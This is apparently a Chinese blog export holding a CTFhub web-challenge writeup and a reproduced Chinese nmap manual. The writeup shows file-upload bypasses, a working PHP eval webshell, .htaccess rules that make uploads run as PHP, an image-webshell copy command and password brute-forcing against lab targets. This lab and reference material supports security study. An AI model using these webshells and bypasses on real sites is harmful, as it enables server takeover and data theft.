解释（搬自php手册）\n$_FILES 数组内容如下:\n\n$_FILES[‘myFile’][‘name’] 客户端文件的原名称。\n\n$_FILES[‘myFile’][‘type’] 文件的 MIME 类型，需要浏览器提供该信息的支持，例如&quot;image&#x2F;gif&quot;。\n\n$_FILES[‘myFile’][‘size’] 已上传文件的大小，单位为字节。\n\n$_FILES[‘myFile’][‘tmp_name’] 文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在 php.ini 的 upload_tmp_dir 指定，但 用 putenv() 函数设置是不起作用的。\n\n$_FILES[‘myFile’][‘error’] 和该文件上传相关的错误代码。[‘error’] 是在 PHP 4.2.0 版本中增加的。下面是它的说明：(它们在 PHP 4.3.0 之后变成了 PHP 常量。)\n\nbasename() 函数：返回路径中的文件名部分。\n$_name 是上传的文件名加后缀\n$_ext 得到的就是后缀名\n重点就在 $des这个变量\n得到的完整路径是 GET[‘road’]+随机数+日期加前面获得的后缀名\n————————————————\n版权声明：本文为CSDN博主「林一不是01」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。\n原文链接：https:&#x2F;&#x2F;blog.csdn.net&#x2F;weixin_45785288&#x2F;article&#x2F;details&#x2F;108412899\n\nburp抓包后我们可以看见\n\n通过题目提示，此题可以用00截断来实现绕过上传验证，所以直接上传一个PHP一句话木马文件，在请求的时候开启抓包，修改\n\n根据之前的题目。我们可以判断出我们上传的文件摆放在upload目录下面。我们直接用蚁剑连接就行\n\n\n3.文件上传之MIME绕过前置知识:MIME概述：​\tMIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。\n​\t它是一个互联网标准，扩展了电子邮件标准，使其能够支持：\n​\t非ASCII字符文本；非文本格式附件（二进制、声音、图像等）；由多部分（multiple parts）组成的消息体；包含非ASCII字符的头信息（Header information）。\n\n\n\n\n\n\n\n\n\nMIME详解:\nhttps://www.runoob.com/http/mime-types.html\n什么是MIME类型校验​\tMIME类型校验就是我们在上传文件到服务端的时候，服务端会对客户端也就是我们上传的文件的Content-Type类型进行检测，如果是白名单所允许的，则可以正常上传，否则上传失败。\n开始做题:\n还是直接上传一个一句话木马,发现文件不匹配\n\n通过开发者工具也没找到白名单\n\n试着上传一个jpg文件,提示上传成功,证明白名单中有jpg\n\n将木马伪装成jpg上传再通过bp改文件后缀\n\n上传成功了\n还有第二种办法\n既然题目提示了是MIME绕过,那就用修改Content-Type类型的方法来试试\n\n首先通过查询得知jpeg文件的MIME类型是image&#x2F;jpeg\n\n如图,上传的是php文件,通过在bp中修改Content-Type为image&#x2F;jpeg来绕过\n\n接下来就是常规操作了\n\n\n4.文件上传漏洞之.htaccess前置知识:\n\n\n\n\n\n\n\n\n.htaccess详解\nhttps://cloud.tencent.com/developer/article/1824057\n什么是.htaccess？​\t.htaccess（超文本访问）是许多Web服务器根据目录应用设置的有用文件，允许在运行时覆盖Apache服务器的默认配置。使用.htaccess，我们可以在运行时轻松启用或禁用任何功能。通过htaccess文件，可以帮助我们实现：网页301重定向，自定义404错误页面，改变文件扩展名，允许或组织特定的用户或者，目录的访问，禁止目录列表，配置默认文档等功能。\n​\t.htaccess是一个完整的文件名，不仅仅是文件的扩展名。\n​\t使用.htaccess配置时要注意，任何小错误都可能会阻止整个网站。很可能我们在.htaccess文件中会遇到状态码为500的错误。\n.htaccess的用途？我们可以使用.htaccess在运行时完成各种任务，下面列出了.htaccess的一些最常用的用法。\n1、重定向或重写URL\n使用.htaccess，我们可以轻松地将用户从一个URL重定向到另一个URL。此外，我们还可以在浏览器窗口中不更改URL的情况下将URL指向其他URL。\n2、启用密码保护\n使用.htaccess，我们可以在整个站点或特定目录访问上启用基本的HTTP身份验证。它可以防止未经授权访问数据。\n3、定义自定义错误页面\n当我们的网站在后端遇到任何错误时，Web服务器会显示每个错误的预定义错误页面。我们可以重新设计自己的错误页面，并在网站发生错误时向最终用户显示。\n4、允许或拒绝用户\n我们可以简单地限制任何用户访问基于该IP地址的特定网页的整个网站。可以简单地允许我们的安全页面仅从特定的ips访问。在这种情况下，如果任何用户试图从未经授权的页面访问安全页面都将获得错误页面。\n5、更改网址\n.htaccess广泛用于更改网站的URL，使其简单易用。我们可以轻松转换在网络浏览器中显示的网址。\n具体实现：\n1、上传.htaccess文件至服务器上传目录，此时apache在解析该目录下的php时将按照文件要求。只要文件名匹配到所定义的字符串，就会将该文件当作php解析。\n\n&lt;FilesMatch &quot;shana&quot;&gt;\nSetHandler application&#x2F;x-httpd-php\n&lt;&#x2F;FilesMatch&gt;\n\n2、上传.htaccess文件设置的关键字的文件名，即上传一个黑名单没有过滤的随意后缀名文件，但文件名中一定要包含shana，如&quot;shana.jpg&quot;，内容为一句话木马。此时&quot;shana.jpg&quot;会被Apache当作php解析。\n————————————————\n版权声明：本文为CSDN博主「欧阳大仙萌萌哒」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。\n原文链接：https:&#x2F;&#x2F;blog.csdn.net&#x2F;shana_8&#x2F;article&#x2F;details&#x2F;104827642\n\n\n\n开始做题思路1\n根据htaccess文件的特性，这道题可以重写文件的解析规则进行绕过。先上传一个名为.htaccess文件，将原有的文件替换掉。其内容如上\n\n上传.htaccess,此时有111的文件当作php文件解析。\n\n试着上传111.php\n\n发现不匹配\n将111.php改为不在黑名单中的后缀名\n\n上传成功\n\n蚁剑连接\n\n思路2\nAddType application&#x2F;x-httpd-php .txt\n\n意思是将.txt后缀的文件当成php解析\n上传该文件\n再上传111.txt\n\n连接蚁剑\n\n5.文件上传漏洞之文件头检查前置知识\n文件头检查是指当浏览器上传到服务器的时候，白名单进行的文件头检测，符合，则允许上传，否则不允许上传。\n\t我们都知道，文件的扩展名是用来识别文件类型的。通过给他指定扩展名，我们可以告诉自己，也告诉操作系统我们想用什么方式打开这个文件。比如我么会把.jpg的文件默认用图片显示软件打开，.zip 文件会默认用解压软件打开等等。\n  然而，扩展名完全是可以随便改改的。我们可以给文件设置一个任意的扩展名，当然也可以不设置扩展名。这样一来我们就不能了解到这个文件究竟是做什么的，究竟是个什么样的文件。我们或许也会疑惑，为什么一个软件，比如视频播放器，就能用正确的方式打开.mp4 .rmvb .wmv 等等的视频？\n  事实上，所有的文件都是以二进制的形式进行存储的，本质上没有差别。之所以使用的方法不同，只是因为我们理解他的方式不同。**在每一个文件（包括图片，视频或其他的非ASCII文件）的开头（十六进制表示）实际上都有一片区域来显示这个文件的实际用法，这就是文件头标志。**\n  文件签名一般都在文件的头部，如果你用十六进制方式查看文件，你就可以看到文件的一些签名信息。如用uestudio工具以十六进制方式查看zip格式的文件，其文件内容头部有50 4B 03 04这样的十六进制信息。同理jpg文件状况有FF D8 FF E0 xx xx 4A 46这样的十六进制信息，其实这此十六进制都是表示一些特殊字条。\n  Linux下我们可以用file命令直接查看文件的实际格式，但是他本质上也是利用文件头标志来进行文件类型判断的。下面就简要介绍下手动判断文件真实类型的方法。\n————————————————\n版权声明：本文为CSDN博主「剑客 getshell」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。\n原文链接：https:&#x2F;&#x2F;blog.csdn.net&#x2F;weixin_45588247&#x2F;article&#x2F;details&#x2F;119592213\n\n\n\n直接做题按照惯例直接上传\n\n根据题目，应该是要做一个图片马，因为检测的是文件头，而不是后缀名\n我们先创造一个名为1.png的图片，然后写一个名为1.php的一句话代码，把他们放到同一目录下，用cmd生成一个名为2.php的图片马\ncopy 1.png&#x2F;b + 1.php&#x2F;a 2.php\n\n命令解释:\n使用CMD制作一句话木马。\n参数&#x2F;b指定以二进制格式复制、合并文件; 用于图像类&#x2F;声音类文件\n参数&#x2F;a指定以ASCII格式复制、合并文件。用于txt等文档类文件\ncopy 1.jpg&#x2F;b+1.php 2.jpg \n&#x2F;&#x2F;意思是将1.jpg以二进制与1.php合并成2.jpg\n那么2.jpg就是图片木马了。\n\n\n\n\n\n修改格式\n\n\n再用蚁剑连接\n\n方法二\n制作一个图片马\n\n上传,抓包,改后缀\n\n成功\n\n蚁剑连接成功\n\n6.文件上传之前端验证前置知识漏洞原理​\tWeb应用系统虽然对用户上传的文件进行了校验，但是校验是通过前端javascript代码完成的。由于恶意用户可以对前端javascript进行修改或者是通过抓包软件篡改上传的文件，就会导致基于js的校验很容易被绕过。\n判断是否存在前端js绕过漏洞：​\t按F12(或者:在网页空白处”右击”–&gt;选择:”检查”)打开调试面板，选择网络，然后上传图片文件和非图片文件，然后对这两个文件的变化进行对比，如果网络中没有数据变化，说明存在js前端验证漏洞，如果有变化说明不存在。(有变化说明，前端没有做验证，是把文件传输到后台，在后台进行验证的，所以才会有网络请求。)\n直接做题方法一:国际惯例\n\n查看网页源码,得知白名单\n\n直接抓包改后缀\n\n上传成功\n\n蚁剑连接成功\n\n方法二:分析前端代码得知它是用js代码实现的过滤,可以考虑直接禁用浏览器的js代码使用来绕过\n\n直接在chrome浏览器中禁用js(其他浏览器可通过插件实现)\n\n此时就能直接上传php木马了\n\n7.文件上传漏洞之无验证这题是文件上传，无验证，也就是说不会对我们上传的文件进行检测过滤，于是可以直接上传一句话木马文件\n&lt;?php\n\t$a&#x3D;$_REQUEST[1];\n\teval($a);\n?&gt;\n\n直接上传一句话木马\n\n\n蚁剑连接成功\n\n拿到flag\n\n8.签到题欢迎来到CTFhub大家庭！\n\n9.密码口令之弱口令常用的字典就是top100弱口令、top1000弱口令之类的字典\n解题思路打开看到管理后台几个大字，猜测用户名可能是admin，密码可能是password之类的\n\n先试试admin，password\n\n发现错误。。于是用bp的狙击手模式进行爆破，具体操作可以在本站找到\n\n\n\n\n\n\n\n\n\nbp攻击模式介绍\nhttps://abyssaler.github.io/post/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3\n\n简单爆破了一下，居然没有找到\n\n扩大字典范围，再次爆破\n\n爆了1w个弱口令了没爆出来，时间用完了。。。直接下一个题目吧\n10.密码口令之默认口令\n首先收集网页信息，发现是北京亿中邮公司产品，再结合题目默认口令，于是去网上搜索\n北京亿中邮信息技术有限公司邮件网关的默认口令\n\n成功破解\n\n11.信息泄露之目录遍历题目考点由于配置错误导致网站的目录可被遍历，一般该类漏洞可以为后续利用提供一些信息上的帮助\n解题思路\n直接点击开始寻找，出现这个界面\n\n挨个遍历就找到flag了\n\n\n","slug":"CTFhub之web练习","date":"2022-11-18T02:44:23.845Z","categories_index":"CTF","tags_index":"writeup","author_index":"Abyssaler"},{"id":"37e3720854a52996fd51ede25d9a35d3","title":"nmap扫描基础","content":"声明：此篇文章是引用来方便自己学习的，原出处在这里\n\n\n\n\n\n\n\n\n\nhttps://gitee.com/qianyongFeng/wiki/blob/master\n名称nmap — 网络探测工具和安全&#x2F;端口扫描器\n命令nmap [ &lt;扫描类型&gt; …] [ &lt;选项&gt; ] { &lt;扫描目标说明&gt; }\n描述注意:本文档描述了Nmap版本4.50。最新文档以英语 https://nmap.org/book/man.html提供。\nNmap (“Network Mapper(网络映射器)”) 是一款开放源代码的 网络探测和安全审核的工具。它的设计目标是快速地扫描大型网络，当然用它扫描单个 主机也没有问题。Nmap以新颖的方式使用原始IP报文来发现网络上有哪些主机，那些 主机提供什么服务(应用程序名和版本)，那些服务运行在什么操作系统(包括版本信息)， 它们使用什么类型的报文过滤器&#x2F;防火墙，以及一堆其它功能。虽然Nmap通常用于安全审核， 许多系统管理员和网络管理员也用它来做一些日常的工作，比如查看整个网络的信息， 管理服务升级计划，以及监视主机和服务的运行。\nNmap输出的是扫描目标的列表，以及每个目标的补充信息，至于是哪些信息则依赖于所使用的选项。 “所感兴趣的端口表格”是其中的关键。那张表列出端口号，协议，服务名称和状态。状态可能是 open(开放的)，filtered(被过滤的)， closed(关闭的)，或者unfiltered(未被过滤的)。 Open(开放的)意味着目标机器上的应用程序正在该端口监听连接&#x2F;报文。 filtered(被过滤的) 意味着防火墙，过滤器或者其它网络障碍阻止了该端口被访问，Nmap无法得知 它是 open(开放的) 还是 closed(关闭的)。 closed(关闭的) 端口没有应用程序在它上面监听，但是他们随时可能开放。 当端口对Nmap的探测做出响应，但是Nmap无法确定它们是关闭还是开放时，这些端口就被认为是 unfiltered(未被过滤的) 如果Nmap报告状态组合 open|filtered 和 closed|filtered时，那说明Nmap无法确定该端口处于两个状态中的哪一个状态。 当要求进行版本探测时，端口表也可以包含软件的版本信息。当要求进行IP协议扫描时 (-sO)，Nmap提供关于所支持的IP协议而不是正在监听的端口的信息。\n除了所感兴趣的端口表，Nmap还能提供关于目标机的进一步信息，包括反向域名，操作系统猜测，设备类型，和MAC地址。\n一个典型的Nmap扫描如例 1 “一个典型的Nmap扫描”所示。在这个例子中，唯一的选项是-A， 用来进行操作系统及其版本的探测，-T4 可以加快执行速度，接着是两个目标主机名。\n例 1. 一个典型的Nmap扫描\n# nmap -A -T4 scanme.nmap.org\n\nNmap scan report for scanme.nmap.org (74.207.244.221)\nHost is up (0.029s latency).\nrDNS record for 74.207.244.221: li86-221.members.linode.com\nNot shown: 995 closed ports\nPORT     STATE    SERVICE     VERSION\n22&#x2F;tcp   open     ssh         OpenSSH 5.3p1 Debian 3ubuntu7 (protocol 2.0)\n| ssh-hostkey: 1024 8d:60:f1:7c:ca:b7:3d:0a:d6:67:54:9d:69:d9:b9:dd (DSA)\n|_2048 79:f8:09:ac:d4:e2:32:42:10:49:d3:bd:20:82:85:ec (RSA)\n80&#x2F;tcp   open     http        Apache httpd 2.2.14 ((Ubuntu))\n|_http-title: Go ahead and ScanMe!\n646&#x2F;tcp  filtered ldp\n1720&#x2F;tcp filtered H.323&#x2F;Q.931\n9929&#x2F;tcp open     nping-echo  Nping echo\nDevice type: general purpose\nRunning: Linux 2.6.X\nOS CPE: cpe:&#x2F;o:linux:linux_kernel:2.6.39\nOS details: Linux 2.6.39\nNetwork Distance: 11 hops\nService Info: OS: Linux; CPE: cpe:&#x2F;o:linux:kernel\n\nTRACEROUTE (using port 53&#x2F;tcp)\nHOP RTT      ADDRESS\n[Cut first 10 hops for brevity]\n11  17.65 ms li86-221.members.linode.com (74.207.244.221)\n\nNmap done: 1 IP address (1 host up) scanned in 14.40 seconds\n\n选项概要当 Nmap 不带选项运行时，该选项概要会被输出，最新的版本在这里 http://www.insecure.org/nmap/data/nmap.usage.txt。它帮助人们记住最常用的选项，但不 能替代本手册其余深入的文档，一些晦涩的选项甚至不在这里。\nUsage: nmap [Scan Type(s)] [Options] &#123;target specification&#125;\nTARGET SPECIFICATION:\n    Can pass hostnames, IP addresses, networks, etc.\n    Ex: scanme.nmap.org, microsoft.com&#x2F;24, 192.168.0.1; 10.0-255.0-255.1-254\n    -iL &lt;inputfilename&gt;: Input from list of hosts&#x2F;networks\n    -iR &lt;num hosts&gt;: Choose random targets\n    --exclude &lt;host1[,host2][,host3],...&gt;: Exclude hosts&#x2F;networks\n    --excludefile &lt;exclude_file&gt;: Exclude list from file\nHOST DISCOVERY:\n    -sL: List Scan - simply list targets to scan\n    -sP: Ping Scan - go no further than determining if host is online\n    -P0: Treat all hosts as online -- skip host discovery\n    -PS&#x2F;PA&#x2F;PU [portlist]: TCP SYN&#x2F;ACK or UDP discovery probes to given ports\n    -PE&#x2F;PP&#x2F;PM: ICMP echo, timestamp, and netmask request discovery probes\n    -n&#x2F;-R: Never do DNS resolution&#x2F;Always resolve [default: sometimes resolve]\nSCAN TECHNIQUES:\n    -sS&#x2F;sT&#x2F;sA&#x2F;sW&#x2F;sM: TCP SYN&#x2F;Connect()&#x2F;ACK&#x2F;Window&#x2F;Maimon scans\n    -sN&#x2F;sF&#x2F;sX: TCP Null, FIN, and Xmas scans\n    --scanflags &lt;flags&gt;: Customize TCP scan flags\n    -sI &lt;zombie host[:probeport]&gt;: Idlescan\n    -sO: IP protocol scan\n    -b &lt;ftp relay host&gt;: FTP bounce scan\nPORT SPECIFICATION AND SCAN ORDER:\n    -p &lt;port ranges&gt;: Only scan specified ports\n    Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080\n    -F: Fast - Scan only the ports listed in the nmap-services file)\n    -r: Scan ports consecutively - don&#39;t randomize\nSERVICE&#x2F;VERSION DETECTION:\n    -sV: Probe open ports to determine service&#x2F;version info\n    --version-light: Limit to most likely probes for faster identification\n    --version-all: Try every single probe for version detection\n    --version-trace: Show detailed version scan activity (for debugging)\nOS DETECTION:\n    -O: Enable OS detection\n    --osscan-limit: Limit OS detection to promising targets\n    --osscan-guess: Guess OS more aggressively\nTIMING AND PERFORMANCE:\n    -T[0-6]: Set timing template (higher is faster)\n    --min-hostgroup&#x2F;max-hostgroup &lt;msec&gt;: Parallel host scan group sizes\n    --min-parallelism&#x2F;max-parallelism &lt;msec&gt;: Probe parallelization\n    --min_rtt_timeout&#x2F;max-rtt-timeout&#x2F;initial-rtt-timeout &lt;msec&gt;: Specifies probe round trip time.\n    --host-timeout &lt;msec&gt;: Give up on target after this long\n    --scan-delay&#x2F;--max_scan-delay &lt;msec&gt;: Adjust delay between probes\nFIREWALL&#x2F;IDS EVASION AND SPOOFING:\n    -f; --mtu &lt;val&gt;: fragment packets (optionally w&#x2F;given MTU)\n    -D &lt;decoy1,decoy2[,ME],...&gt;: Cloak a scan with decoys\n    -S &lt;IP_Address&gt;: Spoof source address\n    -e &lt;iface&gt;: Use specified interface\n    -g&#x2F;--source-port &lt;portnum&gt;: Use given port number\n    --data-length &lt;num&gt;: Append random data to sent packets\n    --ttl &lt;val&gt;: Set IP time-to-live field\n    --spoof-mac &lt;mac address, prefix, or vendor name&gt;: Spoof your MAC address\nOUTPUT:\n    -oN&#x2F;-oX&#x2F;-oS&#x2F;-oG &lt;file&gt;: Output scan results in normal, XML, s|&lt;rIpt kIddi3, and Grepable format, respectively, to the given filename.\n    -oA &lt;basename&gt;: Output in the three major formats at once\n    -v: Increase verbosity level (use twice for more effect)\n    -d[level]: Set or increase debugging level (Up to 9 is meaningful)\n    --packet-trace: Show all packets sent and received\n    --iflist: Print host interfaces and routes (for debugging)\n    --append-output: Append to rather than clobber specified output files\n    --resume &lt;filename&gt;: Resume an aborted scan\n    --stylesheet &lt;path&#x2F;URL&gt;: XSL stylesheet to transform XML output to HTML\n    --no_stylesheet: Prevent Nmap from associating XSL stylesheet w&#x2F;XML output\nMISC:\n    -6: Enable IPv6 scanning\n    -A: Enables OS detection and Version detection\n    --datadir &lt;dirname&gt;: Specify custom Nmap data file location\n    --send-eth&#x2F;--send-ip: Send packets using raw ethernet frames or IP packets\n    --privileged: Assume that the user is fully privileged\n    -V: Print version number\n    -h: Print this help summary page.\nEXAMPLES:\n    nmap -v -A scanme.nmap.org\n    nmap -v -sP 192.168.0.0&#x2F;16 10.0.0.0&#x2F;8\n    nmap -v -iR 10000 -P0 -p 80\n\n目标说明除了选项，所有出现在Nmap命令行上的都被视为对目标主机的说明。 最简单的情况是指定一个目标IP地址或主机名。\n有时候您希望扫描整个网络的相邻主机。为此，Nmap支持CIDR风格的地址。您可以附加 一个&#x2F;在一个IP地址或主机名后面， Nmap将会扫描所有和该参考IP地址具有 相同比特的所有IP地址或主机。 例如，192.168.10.0&#x2F;24将会扫描192.168.10.0 (二进制格式: 11000000 10101000 00001010 00000000)和192.168.10.255 (二进制格式: 11000000 10101000 00001010 11111111)之间的256台主机。 192.168.10.40&#x2F;24 将会做同样的事情。假设主机 scanme.nmap.org的IP地址是205.217.153.62， scanme.nmap.org&#x2F;16 将扫描205.217.0.0和205.217.255.255之间的65,536 个IP地址。 所允许的最小值是&#x2F;1， 这将会扫描半个互联网。最大值是&#x2F;32，这将会扫描该主机或IP地址， 因为所有的比特都固定了。\nCIDR标志位很简洁但有时候不够灵活。例如，您也许想要扫描 192.168.0.0&#x2F;16，但略过任何以.0或者.255 结束的IP地址，因为它们通常是广播地址。 Nmap通过八位字节地址范围支持这样的扫描 您可以用逗号分开的数字或范围列表为IP地址的每个八位字节指定它的范围。 例如，192.168.0-255.1-254 将略过在该范围内以.0和.255结束的地址。 范围不必限于最后的8位：0-255.0-255.13.37 将在整个互联网范围内扫描所有以13.37结束的地址。 这种大范围的扫描对互联网调查研究也许有用。\nIPv6地址只能用规范的IPv6地址或主机名指定。 CIDR 和八位字节范围不支持IPv6，因为它们对于IPv6几乎没什么用。\nNmap命令行接受多个主机说明，它们不必是相同类型。命令nmap scanme.nmap.org 192.168.0.0&#x2F;8 10.0.0，1，3-7.0-255将和您预期的一样执行。\n虽然目标通常在命令行指定，下列选项也可用来控制目标的选择：\n-iL (从列表中输入)\n从 **中读取目标说明。在命令行输入 一堆主机名显得很笨拙，然而经常需要这样。 例如，您的DHCP服务器可能导出10,000个当前租约的列表，而您希望对它们进行 扫描。如果您不是使用未授权的静态IP来定位主机，或许您想要扫描所有IP地址。 只要生成要扫描的主机的列表，用-iL 把文件名作为选项传给Nmap。列表中的项可以是Nmap在 命令行上接受的任何格式(IP地址，主机名，CIDR，IPv6，或者八位字节范围)。 每一项必须以一个或多个空格，制表符或换行符分开。 如果您希望Nmap从标准输入而不是实际文件读取列表， 您可以用一个连字符(-)作为文件名。\n-iR (随机选择目标)\n对于互联网范围内的调查和研究， 您也许想随机地选择目标。 选项告诉 Nmap生成多少个IP。不合需要的IP如特定的私有，组播或者未分配的地址自动 略过。选项 0 意味着永无休止的扫描。记住，一些网管对于未授权的扫描可能会很感冒并加以抱怨。 使用该选项的后果自负! 如果在某个雨天的下午，您觉得实在无聊， 试试这个命令nmap -sS -PS80 -iR 0 -p 80随机地找一些网站浏览。\n–exclude &lt;host1[,host2][,host3],…&gt; (排除主机&#x2F;网络)\n如果在您指定的扫描范围有一些主机或网络不是您的目标， 那就用该选项加上以逗号分隔的列表排除它们。该列表用正常的Nmap语法， 因此它可以包括主机名，CIDR，八位字节范围等等。 当您希望扫描的网络包含执行关键任务的服务器，已知的对端口扫描反应强烈的 系统或者被其它人看管的子网时，这也许有用。\n–excludefile (排除文件中的列表)\n这和–exclude 选项的功能一样，只是所排除的目标是用以 换行符，空格，或者制表符分隔的 **提供的，而不是在命令行上输入的。\n主机发现任何网络探测任务的最初几个步骤之一就是把一组IP范围(有时该范围是巨大的)缩小为 一列活动的或者您感兴趣的主机。扫描每个IP的每个端口很慢，通常也没必要。当然，什么样的主机令您感兴趣主要依赖于扫描的目的。网管也许只对运行特定服务的 主机感兴趣，而从事安全的人士则可能对一个马桶都感兴趣，只要它有IP地址:-)。一个系统管理员 也许仅仅使用Ping来定位内网上的主机，而一个外部入侵测试人员则可能绞尽脑汁用各种方法试图突破防火墙的封锁。\n由于主机发现的需求五花八门，Nmap提供了一箩筐的选项来定制您的需求。 主机发现有时候也叫做ping扫描，但它远远超越用世人皆知的ping工具 发送简单的ICMP回声请求报文。用户完全可以通过使用列表扫描(-sL)或者 通过关闭ping (-P0)跳过ping的步骤，也可以使用多个端口把TCP SYN&#x2F;ACK，UDP和ICMP 任意组合起来玩一玩。这些探测的目的是获得响应以显示某个IP地址是否是活动的(正在被某 主机或者网络设备使用)。 在许多网络上，在给定的时间，往往只有小部分的IP地址是活动的。 这种情况在基于RFC1918的私有地址空间如10.0.0.0&#x2F;8尤其普遍。那个网络有16,000,000个IP，但我见过一些使用它的公司连1000台机器都没有。主机发现能够找到零星分布于IP地址海洋上的那些机器。\n如果没有给出主机发现的选项，Nmap 就发送一个TCP ACK报文到80端口和一个ICMP回声请求到每台目标机器。 一个例外是ARP扫描用于局域网上的任何目标机器。对于非特权UNIX shell用户，使用connect()系统调用会发送一个SYN报文而不是ACK 这些默认行为和使用-PA -PE选项的效果相同。 扫描局域网时，这种主机发现一般够用了，但是对于安全审核，建议进行 更加全面的探测。\n-P选项(用于选择 ping的类型)可以被结合使用。 您可以通过使用不同的TCP端口&#x2F;标志位和ICMP码发送许多探测报文 来增加穿透防守严密的防火墙的机会。另外要注意的是即使您指定了其它 -P*选项，ARP发现(-PR)对于局域网上的 目标而言是默认行为，因为它总是更快更有效。\n下列选项控制主机发现。\n-sL (列表扫描)\n列表扫描是主机发现的退化形式，它仅仅列出指定网络上的每台主机， 不发送任何报文到目标主机。默认情况下，Nmap仍然对主机进行反向域名解析以获取 它们的名字。简单的主机名能给出的有用信息常常令人惊讶。例如， fw.chi.playboy.com是花花公子芝加哥办公室的 防火墙。Nmap最后还会报告IP地址的总数。列表扫描可以很好的确保您拥有正确的目标IP。 如果主机的域名出乎您的意料，那么就值得进一步检查以防错误地扫描其它组织的网络。\n既然只是打印目标主机的列表，像其它一些高级功能如端口扫描，操作系统探测或者Ping扫描 的选项就没有了。如果您希望关闭ping扫描而仍然执行这样的高级功能，请继续阅读关于 -P0选项的介绍。\n-sP (Ping扫描)\n该选项告诉Nmap仅仅 进行ping扫描 (主机发现)，然后打印出对扫描做出响应的那些主机。 没有进一步的测试 (如端口扫描或者操作系统探测)。 这比列表扫描更积极，常常用于 和列表扫描相同的目的。它可以得到些许目标网络的信息而不被特别注意到。 对于攻击者来说，了解多少主机正在运行比列表扫描提供的一列IP和主机名往往更有价值。\n系统管理员往往也很喜欢这个选项。 它可以很方便地得出 网络上有多少机器正在运行或者监视服务器是否正常运行。常常有人称它为 地毯式ping，它比ping广播地址更可靠，因为许多主机对广播请求不响应。\n-sP选项在默认情况下， 发送一个ICMP回声请求和一个TCP报文到80端口。如果非特权用户执行，就发送一个SYN报文 (用connect()系统调用)到目标机的80端口。 当特权用户扫描局域网上的目标机时，会发送ARP请求(-PR)， ，除非使用了–send-ip选项。 -sP选项可以和除-P0)之外的任何发现探测类型-P* 选项结合使用以达到更大的灵活性。 一旦使用了任何探测类型和端口选项，默认的探测(ACK和回应请求)就被覆盖了。 当防守严密的防火墙位于运行Nmap的源主机和目标网络之间时， 推荐使用那些高级选项。否则，当防火墙捕获并丢弃探测包或者响应包时，一些主机就不能被探测到。\n-P0 (无ping)\n该选项完全跳过Nmap发现阶段。 通常Nmap在进行高强度的扫描时用它确定正在运行的机器。 默认情况下，Nmap只对正在运行的主机进行高强度的探测如 端口扫描，版本探测，或者操作系统探测。用-P0禁止 主机发现会使Nmap对每一个指定的目标IP地址 进行所要求的扫描。所以如果在命令行指定一个B类目标地址空间(&#x2F;16)， 所有 65,536 个IP地址都会被扫描。 -P0的第二个字符是数字0而不是字母O。 和列表扫描一样，跳过正常的主机发现，但不是打印一个目标列表， 而是继续执行所要求的功能，就好像每个IP都是活动的。\n-PS [portlist] (TCP SYN Ping)\n该选项发送一个设置了SYN标志位的空TCP报文。 默认目的端口为80 (可以通过改变nmap.h) 文件中的DEFAULT-TCP-PROBE-PORT值进行配置，但不同的端口也可以作为选项指定。 甚至可以指定一个以逗号分隔的端口列表(如 -PS22，23，25，80，113，1050，35000)， 在这种情况下，每个端口会被并发地扫描。\nSYN标志位告诉对方您正试图建立一个连接。 通常目标端口是关闭的，一个RST (复位) 包会发回来。 如果碰巧端口是开放的，目标会进行TCP三步握手的第二步，回应 一个SYN&#x2F;ACK TCP报文。然后运行Nmap的机器则会扼杀这个正在建立的连接， 发送一个RST而非ACK报文，否则，一个完全的连接将会建立。 RST报文是运行Nmap的机器而不是Nmap本身响应的，因为它对收到 的SYN&#x2F;ACK感到很意外。\nNmap并不关心端口开放还是关闭。 无论RST还是SYN&#x2F;ACK响应都告诉Nmap该主机正在运行。\n在UNIX机器上，通常只有特权用户 root 能否发送和接收 原始的TCP报文。因此作为一个变通的方法，对于非特权用户， Nmap会为每个目标主机进行系统调用connect()，它也会发送一个SYN 报文来尝试建立连接。如果connect()迅速返回成功或者一个ECONNREFUSED 失败，下面的TCP堆栈一定已经收到了一个SYN&#x2F;ACK或者RST，该主机将被 标志位为在运行。 如果连接超时了，该主机就标志位为down掉了。这种方法也用于IPv6 连接，因为Nmap目前还不支持原始的IPv6报文。\n-PA [portlist] (TCP ACK Ping)\nTCP ACK ping和刚才讨论的SYN ping相当类似。 也许您已经猜到了，区别就是设置TCP的ACK标志位而不是SYN标志位。 ACK报文表示确认一个建立连接的尝试，但该连接尚未完全建立。 所以远程主机应该总是回应一个RST报文， 因为它们并没有发出过连接请求到运行Nmap的机器，如果它们正在运行的话。\n-PA选项使用和SYN探测相同的默认端口(80)，也可以 用相同的格式指定目标端口列表。如果非特权用户尝试该功能， 或者指定的是IPv6目标，前面说过的connect()方法将被使用。 这个方法并不完美，因为它实际上发送的是SYN报文，而不是ACK报文。\n提供SYN和ACK两种ping探测的原因是使通过防火墙的机会尽可能大。 许多管理员会配置他们的路由器或者其它简单的防火墙来封锁SYN报文，除非 连接目标是那些公开的服务器像公司网站或者邮件服务器。 这可以阻止其它进入组织的连接，同时也允许用户访问互联网。 这种无状态的方法几乎不占用防火墙&#x2F;路由器的资源，因而被硬件和软件过滤器 广泛支持。Linux Netfilter&#x2F;iptables 防火墙软件提供方便的 –syn选项来实现这种无状态的方法。 当这样的无状态防火墙规则存在时，发送到关闭目标端口的SYN ping探测 (-PS) 很可能被封锁。这种情况下，ACK探测格外有闪光点，因为它正好利用了 这样的规则。\n另外一种常用的防火墙用有状态的规则来封锁非预期的报文。 这一特性已开始只存在于高端防火墙，但是这些年类它越来越普遍了。 Linux Netfilter&#x2F;iptables 通过 –state选项支持这一特性，它根据连接状态把报文 进行分类。SYN探测更有可能用于这样的系统，由于没头没脑的ACK报文 通常会被识别成伪造的而丢弃。解决这个两难的方法是通过即指定 -PS又指定-PA来即发送SYN又发送ACK。\n-PU [portlist] (UDP Ping)\n还有一个主机发现的选项是UDP ping，它发送一个空的(除非指定了–data-length UDP报文到给定的端口。端口列表的格式和前面讨论过的-PS和-PA选项还是一样。 如果不指定端口，默认是31338。该默认值可以通过在编译时改变nmap.h文件中的 